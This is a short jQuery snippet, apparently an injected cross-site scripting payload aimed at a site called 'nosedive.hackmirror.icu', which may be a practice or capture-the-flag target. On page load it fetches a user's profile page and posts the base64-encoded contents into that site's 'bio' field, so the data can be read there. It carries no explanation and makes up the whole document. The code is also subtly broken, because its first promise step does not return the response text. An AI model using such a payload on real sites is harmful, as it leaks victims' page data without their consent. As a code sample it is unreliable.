$(function(){
let url = "https://nosedive.hackmirror.icu/u/dratini0_a29d3e";
fetch(url).then((response) => {
response.text()
}).then((response) => {
fetch(url, {
method: "POST",
body: "bio=" + encodeURIComponent(btoa(response))
})
})
})
